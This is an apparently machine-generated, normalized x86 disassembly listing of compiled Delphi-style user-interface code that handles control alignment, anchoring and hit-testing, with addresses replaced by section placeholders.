push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406b0c
mov eax esp
call sub_412a00
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43d93c
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_40349c
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_40349c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_43d968
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_412a00
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_412988
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_43d910
sub_4402b0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_4402f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cb3c
mov eax esi
mov edx [ r-xdata ]
call sub_403450
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_440324
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44041c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_43cef8
push ebx
push sub_441db4
call sub_41b174
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41da44
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41dbec
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_4035c4
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bec8
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_4040c8
lea eax [ ebx + 0x188 ]
call sub_404074
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440423
lea eax [ ebp - 0x8 ]
call sub_404074
retn
sub_440423
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_440448
push ebx
push esi
push edi
call sub_40362c
mov ebx edx
mov edi eax
mov eax edi
call sub_41a384
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_4056e0
mov eax [ edi + 0x178 ]
call sub_4032a0
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_43baa4
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_4410e8
mov eax edi
call sub_441328
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_4032a0
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_4412ec
mov esi eax
mov edx esi
mov eax edi
call sub_441154
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_441328
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_43cfd0
test bl bl
jle r-xdata
call sub_41b20c
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403614
sub_440518
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_4405dc
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_413fdc
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_4447b8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413de4
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_413f30
mov edx esi
mov eax [ ebp - 0xc ]
call sub_413de4
test eax eax
je r-xdata
sub_4405ec
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_440e90
xor eax eax
push ebp
push sub_44062c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43d234
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440633
mov eax [ ebp - 0x4 ]
call sub_440e98
retn
sub_440633
mov eax [ ebp - 0x4 ]
call sub_440518
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441cec
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_43efc4
sub_440668
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_440683 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_4406f4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4448fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_412988
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_440a75
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440a7c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_44098a ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call sub_4061f4
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_4408ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call sub_4061f4
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_440a7c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_440aab ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_440b34
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_441328
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_413c88
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_413de4
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_4406f4
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4412ec
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_413e60
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_413de4
mov edx eax
mov ecx ebx
mov eax edi
call sub_440668
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_440ca4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_441328
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_4412ec
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_4412ec
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_440cf8
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_440ca4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_440dd7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_440b34
pop ecx
push ebp
mov al 0x2
call sub_440b34
pop ecx
push ebp
mov al 0x3
call sub_440b34
pop ecx
push ebp
mov al 0x4
call sub_440b34
pop ecx
push ebp
mov al 0x5
call sub_440b34
pop ecx
push ebp
mov al 0x6
call sub_440b34
pop ecx
push ebp
xor eax eax
call sub_440b34
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_40349c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_40349c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_440dfc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4448fc
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440e90
xor eax eax
push ebp
push sub_440e83
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_440e98
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_440ec0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_440f85
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43d7fc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_441328
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440f8c
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4412ec
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413c88
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43d568
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_413de4
xor ecx ecx
mov edx 0xb03e
call sub_43efc4
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4412ec
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_440f94
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441328
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_440e90
xor edx edx
push ebp
push sub_44107b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_441328
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_40349c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4412ec
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413c88
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_413de4
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a0
mov eax [ ebp - 0x4 ]
call sub_440e98
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4412ec
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_43d30c
mov dl 0x4
call sub_43d30c
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_413cd4
sub_4410e8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_455244
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_458f68
sub_441108
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43c6ec
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43c6ec
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43c6ec
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_441154
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43c714
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43c714
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43c714
jmp r-xdata
xor eax eax
